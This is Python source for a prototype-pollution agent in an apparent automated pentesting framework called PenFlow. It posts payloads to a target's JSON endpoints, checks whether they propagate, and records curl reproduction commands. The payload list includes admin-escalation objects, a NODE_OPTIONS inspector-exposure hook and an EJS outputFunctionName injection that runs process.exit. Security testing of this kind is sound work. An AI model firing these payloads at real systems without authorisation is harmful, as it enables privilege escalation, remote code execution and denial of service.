"""
Prototype Pollution Capability Agent for PenFlow.

Capabilities:
  - Client-side Prototype Pollution (__proto__, constructor.prototype)
  - Server-side Node.js/Express JSON merge object pollution
  - Global prototype property propagation verification
  - Deep nesting, array prototype, and RCE payload detection (NODE_OPTIONS, outputFunctionName)
  - Dynamic discovery of JSON endpoints from recon observations
"""
import httpx
import json
from typing import Dict, Any, List, Optional
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.prototype_pollution")

POLLUTION_PAYLOADS = [
    # 1. Classic __proto__
    {"__proto__": {"polluted_flag": "penflow_pp_test", "isAdmin": True}},
    {"__proto__": {"admin": True, "role": "admin"}},

    # 2. constructor.prototype
    {"constructor": {"prototype": {"polluted_flag": "penflow_pp_test"}}},
    {"constructor": {"prototype": {"admin": True}}},

    # 3. Nested merge pollution
    {"user": {"__proto__": {"role": "admin"}}},

    # 4. JSON string payload
    '{"__proto__": {"polluted_flag": "penflow_pp_test"}}',

    # 5. Deep nesting bypass
    {"a": {"b": {"__proto__": {"polluted_flag": "penflow_pp_test"}}}},

    # 6. Array prototype pollution
    {"__proto__": ["penflow_array_pp"]},

    # 7. Node.js process & inspect RCE hooks
    {"__proto__": {"shell": "sleep 1", "NODE_OPTIONS": "--inspect=0.0.0.0:1337"}},

    # 8. Template literal / toString injection bridge
    {"__proto__": {"toString": "[native code]", "valueOf": "penflow_pp_test"}},

    # 9. Express / EJS template engine RCE hook
    {"__proto__": {"polluted": True, "outputFunctionName": "x;process.exit(1)//"}},

    # 10. Lodash / Underscore defaults pollution
    {"__proto__": {"defaultHeaders": {"X-Polluted": "true"}}},

    # 11. Fastify / Body-Parser schema pollution
    {"__proto__": {"type": "object", "properties": {"polluted": {"type": "boolean"}}}},

    # 12. Generic status override
    {"__proto__": {"status": 200, "authenticated": True}}
]


class PrototypePollutionCapabilityAgent(BaseCapabilityAgent):
    """
    Agent detecting Server-side and Client-side Object Prototype Pollution in Node.js/Express
    endpoints, JSON merge functions, and template engines.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="PrototypePollutionCapabilityAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="prototype_pollution", name="Prototype Pollution", description="Detects object prototype pollution", priority=self.priority, tags=["prototype_pollution"]),
            Capability(id="server_side_pollution", name="Server-Side Pollution", description="Detects server-side Node.js pollution", priority=self.priority, tags=["nodejs"]),
            Capability(id="rce_via_pollution", name="Prototype Pollution RCE", description="Detects Node.js & template engine RCE via prototype pollution", priority=self.priority, tags=["rce", "nodejs"])
        ]

    def _discover_json_endpoints(self, context: CapabilityExecutionContext) -> List[str]:
        """Dynamically extracts endpoints likely accepting JSON body from recon observations."""
        endpoints = []
        if context.observations:
            for obs in context.observations:
                data = obs.get("data", {}) if isinstance(obs, dict) else {}
                if isinstance(data, dict):
                    if "url" in data and data["url"]:
                        endpoints.append(data["url"])
                    elif "endpoints" in data and isinstance(data["endpoints"], list):
                        for ep in data["endpoints"]:
                            if isinstance(ep, dict) and ep.get("url"):
                                url = ep["url"]
                                method = ep.get("method", "GET").upper()
                                if method in ("POST", "PUT", "PATCH"):
                                    endpoints.append(url)

        dynamic_eps = context.get_dynamic_endpoints()
        if dynamic_eps:
            for ep in dynamic_eps:
                if isinstance(ep, dict) and ep.get("url"):
                    endpoints.append(ep["url"])

        base = f"https://{context.asset}"
        if not endpoints:
            endpoints = [
                f"{base}/api/v1/user/profile",
                f"{base}/api/v1/user/update",
                f"{base}/api/v1/settings",
                f"{base}/api/v1/account",
                f"{base}/api/v1/user"
            ]

        # Deduplicate and prioritize endpoints with /api/ or /user/ or /profile
        unique_eps = list(dict.fromkeys(endpoints))
        return unique_eps[:8]

    def _assess_impact(self, polluted_keys: List[str]) -> str:
        if any(k in polluted_keys for k in ("shell", "NODE_OPTIONS", "outputFunctionName")):
            return "CRITICAL — Potential Remote Code Execution (RCE) via Node.js/Template Engine prototype pollution."
        if any(k in polluted_keys for k in ("admin", "isAdmin", "role")):
            return "CRITICAL — Admin privilege escalation via server-side prototype pollution."
        return "HIGH — Server-side Object prototype modified via JSON merge operation."

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []

        target_endpoints = self._discover_json_endpoints(context)

        try:
            async with httpx.AsyncClient(timeout=10.0, follow_redirects=False, verify=False) as client:
                for target_url in target_endpoints:
                    for payload in POLLUTION_PAYLOADS:
                        try:
                            # Phase 1: Send pollution request
                            headers = {"Content-Type": "application/json"}
                            if isinstance(payload, str):
                                resp1 = await client.post(target_url, content=payload, headers=headers)
                            else:
                                resp1 = await client.post(target_url, json=payload, headers=headers)

                            if resp1.status_code in (200, 201, 400, 422, 500):
                                # Phase 2: Perform global propagation check via clean GET request
                                check_resp = await client.get(target_url)
                                is_polluted = "polluted_flag" in check_resp.text or "penflow_pp_test" in check_resp.text or "penflow_array_pp" in check_resp.text

                                if is_polluted:
                                    payload_str = json.dumps(payload) if isinstance(payload, dict) else str(payload)
                                    curl_cmd = f"curl -X POST '{target_url}' -H 'Content-Type: application/json' -d '{payload_str}'"
                                    exch_dict = {
                                        "request": {"method": "POST", "url": target_url, "headers": headers, "body": payload_str},
                                        "response": {"status_code": resp1.status_code, "body_snippet": resp1.text[:500]}
                                    }
                                    polluted_keys = list(payload.get("__proto__", {}).keys()) if isinstance(payload, dict) and "__proto__" in payload else ["polluted_flag"]
                                    impact_desc = self._assess_impact(polluted_keys)

                                    findings.append({
                                        "vulnerability_type": "prototype_pollution",
                                        "capability_id": capability_id,
                                        "target_url": target_url,
                                        "payload": payload,
                                        "severity": "CRITICAL" if "CRITICAL" in impact_desc else "HIGH",
                                        "confidence": 0.95,
                                        "is_vulnerable": True,
                                        "exploit_curl": curl_cmd,
                                        "reproduction_steps": self.poc_generator.generate_reproduction_steps("Prototype Pollution", target_url, curl_cmd),
                                        "description": impact_desc,
                                        "_exchange_obj": exch_dict
                                    })
                                    evidence["pollution_success"] = True
                                    evidence["polluted_endpoint"] = target_url
                                    evidence["payload_used"] = payload
                                    break
                        except Exception as ep_err:
                            logger.debug(f"Prototype pollution payload failed on {target_url}: {ep_err}")
                    if findings:
                        break
        except Exception as e:
            logger.error(f"[{self.name}] Exception testing '{context.asset}': {e}")

        is_vuln = len(findings) > 0
        primary_exch = findings[0].get("_exchange_obj") if findings else None
        return {
            "capability_id": capability_id,
            "status": "COMPLETED",
            "agent": self.name,
            "is_vulnerable": is_vuln,
            "vulnerable": is_vuln,
            "confidence": 0.95 if is_vuln else 0.0,
            "confidence_score": 0.95 if is_vuln else 0.0,
            "_exchange_obj": primary_exch,
            "evidence": evidence,
            "findings": findings
        }
